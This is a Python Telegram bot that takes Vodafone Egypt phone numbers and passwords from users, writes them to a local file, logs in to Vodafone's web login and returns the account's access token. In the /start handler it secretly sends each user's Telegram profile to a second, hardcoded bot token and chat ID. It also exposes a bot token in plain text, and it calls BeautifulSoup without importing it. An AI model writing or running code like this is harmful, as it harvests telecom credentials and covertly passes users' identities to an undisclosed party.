import requests,user_agent,json,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)


@bot.message_handler(commands=["start"])
def start(message):
	idjejeje = message.from_user
	bot.send_message(message.chat.id,"<strong>Hello Pro Bot Get Cookie Vodafone\nPleaze send Number Or Passowrd\nEx010********:pas</strong>",parse_mode="html")
	ID = "1396476109"
	tttooo = "5086218396:AAHAj4Gu7lDM8IZToQ6oRmtsUnNgRPSmT7M"
	sensess = requests.get(f'''https://api.telegram.org/bot{tttooo}/sendMessage?chat_id={ID}&text= New Login info \n{idjejeje}\n''')
@bot.message_handler(func=lambda m: True)
def reques(message):
	msg = message.text
	with open("num_pass.txt","w")as save:
		save.write(msg)
		save.close()
	file = open("num_pass.txt","r")
	BT=file.readline().split('\n')[0]
	number = BT.split(':')[0]
	pwd = BT.split(':')[1]
	req = requests.Session()
	latters= "qwertyuiopasdfghjklzxcvbnm"
	random_Link = ''.join(random.choice(latters) for i in range(10))
	url = f'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/auth?client_id=website&redirect_uri=https%3A%2F%2Fweb.vodafone.com.eg%2Far%2FKClogin&state=286d1217-db14-4846-86c1-9539beea01ed&response_mode=query&response_type=code&scope=openid&nonce={random_Link}&kc_locale=en'
	log = req.get(url)
	soup = BeautifulSoup(log.content, 'html.parser')
	soup1 = soup.find('form').get('action')
	Headees = {

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

    'Accept-Encoding': 'gzip, deflate, br',

    'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',

    'Connection': 'keep-alive',

    'Content-Type': 'application/x-www-form-urlencoded',

    'Host': 'web.vodafone.com.eg',

    'Origin': 'https://web.vodafone.com.eg',

    'Referer': url,

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'

    }
	data1 = {

    'username':number,

    'password':pwd

    }
	requests_post = req.post(soup1,headers=Headees,data=data1)
	code = requests_post.url
	_checkRegistry = code.find('KClogin')
	Code1 = code[code.index('code=') + 5:]
	headers_request = {

        'Accept': '*/*',

        'Accept-Encoding': 'gzip, deflate, br',

        'Accept-Language': 'en-GB,en;q=0.9,ar;q=0.8,ar-EG;q=0.7,en-US;q=0.6',

        'Connection': 'keep-alive',

        'Content-type': 'application/x-www-form-urlencoded',

        'Host': 'web.vodafone.com.eg',

        'Origin': 'https://web.vodafone.com.eg',

        'Referer': 'https://web.vodafone.com.eg/ar/KClogin',

        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'

        }
         
	datax = {

'code': Code1,

        'grant_type': 'authorization_code',

        'client_id': 'website',

        'redirect_uri': 'https://web.vodafone.com.eg/ar/KClogin'

        }
       
	try:
		url12 = "https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
		data_token = req.post(url12,headers=headers_request,data=datax)
		Token_Access_pass = data_token.json()['access_token']
		bot.send_message(message.chat.id,Token_Access_pass)
	except:
		bot.send_message(message.chat.id,"Error Number Or Password")
		

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://appsrcs.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
